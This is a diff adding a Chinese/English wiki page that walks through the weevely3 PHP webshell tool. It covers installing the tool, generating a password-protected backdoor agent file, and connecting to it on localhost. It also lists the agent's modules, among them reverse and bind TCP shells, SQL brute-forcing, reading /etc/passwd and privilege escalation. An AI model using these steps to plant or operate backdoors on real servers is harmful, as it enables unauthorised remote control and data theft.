@@ -1,0 +1,149 @@
+<!DOCTYPE HTML>
+<html>
+    <head>
+        <link rel="Stylesheet" type="text/css" href="/static/css/style.css">
+        <link rel="Stylesheet" type="text/css" href="/static/css/tango.css">
+        <title>backdoor - Wiki | janes</title>
+        <meta name="keywords" content=""/>
+        <meta name="description" content=""/>
+        <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    </head>
+
+    <body>
+        <div id="container">
+            
+<div id="header">
+  <div id="post-nav"><a href="/">Home</a>&nbsp;»&nbsp;<a href="/#WebSecurity">WebSecurity</a>&nbsp;»&nbsp;backdoor</div>
+</div>
+<div class="clearfix"></div>
+<div id="title">backdoor</div>
+  <div id="content">
+  <h2 id="weevely3">weevely3</h2>
+<p><a href="https://github.com/epinna/weevely3">github weevely3</a></p>
+<p>weevely是一款使用python编写的webshell工具, 能生成webshell和连接，仅适用于php</p>
+<ul>
+<li>install</li>
+</ul>
+<p>The following example runs on a Debian/Ubuntu derived Linux environments with Python version 2.7.</p>
+<div class="hlcode"><pre><span class="cp"># Make sure that the python package manager and yaml libraries are installed</span>
+<span class="err">$</span> <span class="n">sudo</span> <span class="n">apt</span><span class="o">-</span><span class="n">get</span> <span class="n">install</span> <span class="n">g</span><span class="o">++</span> <span class="n">python</span><span class="o">-</span><span class="n">pip</span> <span class="n">libyaml</span><span class="o">-</span><span class="n">dev</span> <span class="n">python</span><span class="o">-</span><span class="n">dev</span>
+<span class="cp"># Install requirements</span>
+<span class="err">$</span> <span class="n">sudo</span> <span class="n">pip</span> <span class="n">install</span> <span class="n">prettytable</span> <span class="n">Mako</span> <span class="n">PyYAML</span> <span class="n">python</span><span class="o">-</span><span class="n">dateutil</span> <span class="n">PySocks</span> <span class="o">--</span><span class="n">upgrade</span>
+</pre></div>
+
+
+<p>then download weevely from github</p>
+<ul>
+<li>set link</li>
+</ul>
+<div class="hlcode"><pre><span class="n">sudo</span> <span class="n">ln</span> <span class="o">-</span><span class="n">s</span> <span class="o">~/</span><span class="n">Tool</span><span class="o">/</span><span class="n">weevely3</span><span class="o">/</span><span class="n">weevely</span><span class="p">.</span><span class="n">py</span> <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">local</span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">weevely</span>
+</pre></div>
+
+
+<h2 id="use-help">use help</h2>
+<div class="hlcode"><pre><span class="err">$</span> <span class="n">python</span> <span class="n">weevely</span><span class="p">.</span><span class="n">py</span> <span class="o">-</span><span class="n">h</span>
+<span class="nl">usage:</span> <span class="n">weevely</span> <span class="p">[</span><span class="o">-</span><span class="n">h</span><span class="p">]</span> <span class="p">{</span><span class="n">terminal</span><span class="p">,</span><span class="n">session</span><span class="p">,</span><span class="n">generate</span><span class="p">}</span> <span class="p">...</span>
+
+<span class="n">positional</span> <span class="n">arguments</span><span class="o">:</span>
+  <span class="p">{</span><span class="n">terminal</span><span class="p">,</span><span class="n">session</span><span class="p">,</span><span class="n">generate</span><span class="p">}</span>
+    <span class="n">terminal</span>            <span class="n">Run</span> <span class="n">terminal</span>
+    <span class="n">session</span>             <span class="n">Recover</span> <span class="n">an</span> <span class="n">existant</span> <span class="n">a</span> <span class="n">session</span> <span class="n">file</span>
+    <span class="n">generate</span>            <span class="n">Generate</span> <span class="n">a</span> <span class="n">new</span> <span class="n">password</span>
+
+<span class="n">optional</span> <span class="n">arguments</span><span class="o">:</span>
+  <span class="o">-</span><span class="n">h</span><span class="p">,</span> <span class="o">--</span><span class="n">help</span>            <span class="n">show</span> <span class="n">this</span> <span class="n">help</span> <span class="n">message</span> <span class="n">and</span> <span class="n">exit</span>
+</pre></div>
+
+
+<h2 id="generate-backdoor-agent">generate backdoor agent</h2>
+<div class="hlcode"><pre><span class="n">weevely</span> <span class="n">generate</span> <span class="o">-</span><span class="n">h</span>
+<span class="nl">usage:</span> <span class="n">weevely</span> <span class="n">generate</span> <span class="p">[</span><span class="o">-</span><span class="n">h</span><span class="p">]</span> <span class="p">[</span><span class="o">-</span><span class="n">obfuscator</span> <span class="p">{</span><span class="n">cleartext1_php</span><span class="p">,</span><span class="n">obfusc1_php</span><span class="p">}]</span>
+                        <span class="p">[</span><span class="o">-</span><span class="n">agent</span> <span class="p">{</span><span class="n">stegaref_php_debug</span><span class="p">,</span><span class="n">legacycookie_php</span><span class="p">,</span><span class="n">stegaref_php</span><span class="p">}]</span>
+                        <span class="n">password</span> <span class="n">path</span>
+
+<span class="n">positional</span> <span class="n">arguments</span><span class="o">:</span>
+  <span class="n">password</span>              <span class="n">The</span> <span class="n">agent</span> <span class="n">password</span>
+  <span class="n">path</span>                  <span class="n">Where</span> <span class="n">save</span> <span class="n">the</span> <span class="n">generated</span> <span class="n">agent</span>
+
+<span class="n">optional</span> <span class="n">arguments</span><span class="o">:</span>
+  <span class="o">-</span><span class="n">h</span><span class="p">,</span> <span class="o">--</span><span class="n">help</span>            <span class="n">show</span> <span class="n">this</span> <span class="n">help</span> <span class="n">message</span> <span class="n">and</span> <span class="n">exit</span>
+  <span class="o">-</span><span class="n">obfuscator</span> <span class="p">{</span><span class="n">cleartext1_php</span><span class="p">,</span><span class="n">obfusc1_php</span><span class="p">}</span>
+  <span class="o">-</span><span class="n">agent</span> <span class="p">{</span><span class="n">stegaref_php_debug</span><span class="p">,</span><span class="n">legacycookie_php</span><span class="p">,</span><span class="n">stegaref_php</span><span class="p">}</span>
+</pre></div>
+
+
+<div class="hlcode"><pre><span class="err">$</span> <span class="n">weevely</span> <span class="n">generate</span> <span class="n">password</span> <span class="n">agent</span><span class="p">.</span><span class="n">php</span> 
+<span class="n">Generated</span> <span class="n">backdoor</span> <span class="n">with</span> <span class="n">password</span> <span class="err">&#39;</span><span class="n">password</span><span class="err">&#39;</span> <span class="n">in</span> <span class="err">&#39;</span><span class="n">agent</span><span class="p">.</span><span class="n">php</span><span class="err">&#39;</span> <span class="n">of</span> <span class="mi">1322</span> <span class="n">byte</span> <span class="n">size</span><span class="p">.</span>
+</pre></div>
+
+
+<h2 id="connect-to-agent">connect to agent</h2>
+<div class="hlcode"><pre><span class="err">$</span> <span class="n">weevely</span> <span class="n">http</span><span class="o">:</span><span class="c1">//target/agent.php password</span>
+
+<span class="n">weevely</span> <span class="n">http</span><span class="o">:</span><span class="c1">//localhost/backdoor/agent.php x</span>
+
+<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">weevely</span> <span class="mf">3.2.0</span>
+
+<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">Target</span><span class="o">:</span> <span class="n">localhost</span>
+<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">Session</span><span class="o">:</span>    <span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">hx</span><span class="o">/</span><span class="p">.</span><span class="n">weevely</span><span class="o">/</span><span class="n">sessions</span><span class="o">/</span><span class="n">localhost</span><span class="o">/</span><span class="n">agent_0</span><span class="p">.</span><span class="n">session</span>
+
+<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">Browse</span> <span class="n">the</span> <span class="n">filesystem</span> <span class="n">or</span> <span class="n">execute</span> <span class="n">commands</span> <span class="n">starts</span> <span class="n">the</span> <span class="n">connection</span>
+<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">to</span> <span class="n">the</span> <span class="n">target</span><span class="p">.</span> <span class="n">Type</span> <span class="o">:</span><span class="n">help</span> <span class="k">for</span> <span class="n">more</span> <span class="n">information</span><span class="p">.</span>
+
+<span class="n">weevely</span><span class="o">&gt;</span> <span class="n">help</span>
+
+ <span class="o">:</span><span class="n">audit_etcpasswd</span>      <span class="n">Get</span> <span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">passwd</span> <span class="n">with</span> <span class="n">different</span> <span class="n">techniques</span><span class="p">.</span>                           
+ <span class="o">:</span><span class="n">audit_filesystem</span>     <span class="n">Audit</span> <span class="n">system</span> <span class="n">files</span> <span class="k">for</span> <span class="n">wrong</span> <span class="n">permissions</span><span class="p">.</span>                            
+ <span class="o">:</span><span class="n">audit_phpconf</span>        <span class="n">Audit</span> <span class="n">PHP</span> <span class="n">configuration</span><span class="p">.</span>                                             
+ <span class="o">:</span><span class="n">audit_suidsgid</span>       <span class="n">Find</span> <span class="n">files</span> <span class="n">with</span> <span class="n">SUID</span> <span class="n">or</span> <span class="n">SGID</span> <span class="n">flags</span><span class="p">.</span>                                  
+ <span class="o">:</span><span class="n">shell_php</span>            <span class="n">Execute</span> <span class="n">PHP</span> <span class="n">commands</span><span class="p">.</span>                                                
+ <span class="o">:</span><span class="n">shell_su</span>             <span class="n">Elevate</span> <span class="n">privileges</span> <span class="n">with</span> <span class="n">su</span> <span class="n">command</span><span class="p">.</span>                                  
+ <span class="o">:</span><span class="n">shell_sh</span>             <span class="n">Execute</span> <span class="n">Shell</span> <span class="n">commands</span><span class="p">.</span>                                              
+ <span class="o">:</span><span class="n">system_info</span>          <span class="n">Collect</span> <span class="n">system</span> <span class="n">information</span><span class="p">.</span>                                          
+ <span class="o">:</span><span class="n">system_extensions</span>    <span class="n">Collect</span> <span class="n">PHP</span> <span class="n">and</span> <span class="n">webserver</span> <span class="n">extension</span> <span class="n">list</span><span class="p">.</span>                            
+ <span class="o">:</span><span class="n">backdoor_reversetcp</span>  <span class="n">Execute</span> <span class="n">a</span> <span class="n">reverse</span> <span class="n">TCP</span> <span class="n">shell</span><span class="p">.</span>                                         
+ <span class="o">:</span><span class="n">backdoor_tcp</span>         <span class="n">Spawn</span> <span class="n">a</span> <span class="n">shell</span> <span class="n">on</span> <span class="n">a</span> <span class="n">TCP</span> <span class="n">port</span><span class="p">.</span>                                         
+ <span class="o">:</span><span class="n">bruteforce_sql</span>       <span class="n">Bruteforce</span> <span class="n">SQL</span> <span class="n">database</span><span class="p">.</span>                                             
+ <span class="o">:</span><span class="n">file_enum</span>            <span class="n">Check</span> <span class="n">existence</span> <span class="n">and</span> <span class="n">permissions</span> <span class="n">of</span> <span class="n">a</span> <span class="n">list</span> <span class="n">of</span> <span class="n">paths</span><span class="p">.</span>                  
+ <span class="o">:</span><span class="n">file_edit</span>            <span class="n">Edit</span> <span class="n">remote</span> <span class="n">file</span> <span class="n">on</span> <span class="n">a</span> <span class="n">local</span> <span class="n">editor</span><span class="p">.</span>                                  
+ <span class="o">:</span><span class="n">file_zip</span>             <span class="n">Compress</span> <span class="n">or</span> <span class="n">expand</span> <span class="n">zip</span> <span class="n">files</span><span class="p">.</span>                                        
+ <span class="o">:</span><span class="n">file_upload</span>          <span class="n">Upload</span> <span class="n">file</span> <span class="n">to</span> <span class="n">remote</span> <span class="n">filesystem</span><span class="p">.</span>                                    
+ <span class="o">:</span><span class="n">file_webdownload</span>     <span class="n">Download</span> <span class="n">URL</span> <span class="n">to</span> <span class="n">the</span> <span class="n">filesystem</span>                                       
+ <span class="o">:</span><span class="n">file_upload2web</span>      <span class="n">Upload</span> <span class="n">file</span> <span class="n">automatically</span> <span class="n">to</span> <span class="n">a</span> <span class="n">web</span> <span class="n">folder</span> <span class="n">and</span> <span class="n">get</span> <span class="n">corresponding</span> <span class="n">URL</span><span class="p">.</span> 
+ <span class="o">:</span><span class="n">file_mount</span>           <span class="n">Mount</span> <span class="n">remote</span> <span class="n">filesystem</span> <span class="n">using</span> <span class="n">HTTPfs</span><span class="p">.</span>                                
+ <span class="o">:</span><span class="n">file_read</span>            <span class="n">Read</span> <span class="n">remote</span> <span class="n">file</span> <span class="n">from</span> <span class="n">the</span> <span class="n">remote</span> <span class="n">filesystem</span><span class="p">.</span>                         
+ <span class="o">:</span><span class="n">file_gzip</span>            <span class="n">Compress</span> <span class="n">or</span> <span class="n">expand</span> <span class="n">gzip</span> <span class="n">files</span><span class="p">.</span>                                       
+ <span class="o">:</span><span class="n">file_tar</span>             <span class="n">Compress</span> <span class="n">or</span> <span class="n">expand</span> <span class="n">tar</span> <span class="n">archives</span><span class="p">.</span>                                     
+ <span class="o">:</span><span class="n">file_cd</span>              <span class="n">Change</span> <span class="n">current</span> <span class="n">working</span> <span class="n">directory</span><span class="p">.</span>                                    
+ <span class="o">:</span><span class="n">file_find</span>            <span class="n">Find</span> <span class="n">files</span> <span class="n">with</span> <span class="n">given</span> <span class="n">names</span> <span class="n">and</span> <span class="n">attributes</span><span class="p">.</span>                          
+ <span class="o">:</span><span class="n">file_check</span>           <span class="n">Get</span> <span class="n">remote</span> <span class="n">file</span> <span class="n">information</span><span class="p">.</span>                                         
+ <span class="o">:</span><span class="n">file_grep</span>            <span class="n">Print</span> <span class="n">lines</span> <span class="n">matching</span> <span class="n">a</span> <span class="n">pattern</span> <span class="n">in</span> <span class="n">multiple</span> <span class="n">files</span><span class="p">.</span>                    
+ <span class="o">:</span><span class="n">file_download</span>        <span class="n">Download</span> <span class="n">file</span> <span class="n">to</span> <span class="n">remote</span> <span class="n">filesystem</span><span class="p">.</span>                                  
+ <span class="o">:</span><span class="n">file_cp</span>              <span class="n">Copy</span> <span class="n">single</span> <span class="n">file</span><span class="p">.</span>                                                    
+ <span class="o">:</span><span class="n">file_touch</span>           <span class="n">Change</span> <span class="n">file</span> <span class="n">timestamp</span><span class="p">.</span>                                               
+ <span class="o">:</span><span class="n">file_rm</span>              <span class="n">Remove</span> <span class="n">remote</span> <span class="n">file</span><span class="p">.</span>                                                  
+ <span class="o">:</span><span class="n">file_bzip2</span>           <span class="n">Compress</span> <span class="n">or</span> <span class="n">expand</span> <span class="n">bzip2</span> <span class="n">files</span><span class="p">.</span>                                      
+ <span class="o">:</span><span class="n">file_ls</span>              <span class="n">List</span> <span class="n">directory</span> <span class="n">content</span><span class="p">.</span>                                              
+ <span class="o">:</span><span class="n">sql_console</span>          <span class="n">Execute</span> <span class="n">SQL</span> <span class="n">query</span> <span class="n">or</span> <span class="n">run</span> <span class="n">console</span><span class="p">.</span>                                    
+ <span class="o">:</span><span class="n">sql_dump</span>             <span class="n">Multi</span> <span class="n">dbms</span> <span class="n">mysqldump</span> <span class="n">replacement</span><span class="p">.</span>                                    
+ <span class="o">:</span><span class="n">net_ifconfig</span>         <span class="n">Get</span> <span class="n">network</span> <span class="n">interfaces</span> <span class="n">addresses</span><span class="p">.</span>                                    
+ <span class="o">:</span><span class="n">net_curl</span>             <span class="n">Perform</span> <span class="n">a</span> <span class="n">curl</span><span class="o">-</span><span class="n">like</span> <span class="n">HTTP</span> <span class="n">request</span><span class="p">.</span>                                    
+ <span class="o">:</span><span class="n">net_scan</span>             <span class="n">TCP</span> <span class="n">Port</span> <span class="n">scan</span><span class="p">.</span>                                                       
+ <span class="o">:</span><span class="n">net_phpproxy</span>         <span class="n">Install</span> <span class="n">PHP</span> <span class="n">proxy</span> <span class="n">on</span> <span class="n">the</span> <span class="n">target</span><span class="p">.</span>                                     
+ <span class="o">:</span><span class="n">net_proxy</span>            <span class="n">Proxify</span> <span class="n">local</span> <span class="n">HTTP</span> <span class="n">traffic</span> <span class="n">passing</span> <span class="n">through</span> <span class="n">the</span> <span class="n">target</span><span class="p">.</span>               
+
+<span class="n">www</span><span class="o">-</span><span class="n">data</span><span class="err">@</span><span class="n">kali</span><span class="o">:/</span><span class="n">var</span><span class="o">/</span><span class="n">www</span><span class="o">/</span><span class="n">backdoor</span> <span class="err">$</span> <span class="n">ls</span>
+<span class="n">agent</span><span class="p">.</span><span class="n">php</span>
+</pre></div>
+</div>
+
+        </div>
+        <div id="footer">
+            <span>
+                Copyright © 2012-2016 .
+                Powered by <a href="http://simiki.org/" target="_blank">Simiki</a>.
+            </span>
+        </div>
+        
+    </body>
+</html>
